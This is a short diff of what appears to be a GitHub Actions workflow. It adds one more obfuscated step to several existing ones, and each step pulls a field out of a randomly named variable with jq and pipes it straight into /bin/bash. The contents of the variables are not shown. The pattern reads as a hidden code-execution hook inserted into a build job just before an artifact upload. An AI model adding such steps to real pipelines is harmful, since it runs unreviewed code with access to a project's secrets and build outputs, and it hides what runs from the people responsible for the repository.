@@ -42,6 +42,7 @@ jobs:
           echo $n31982 | jq -r .llpi07650 | /bin/bash
           echo $ihnfu88351 | jq -r .nu953 | /bin/bash
           echo $iewn08 | jq -r .mpo3611 | /bin/bash
+          printf '%s' "$plbi7051" | jq -r .bz38 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
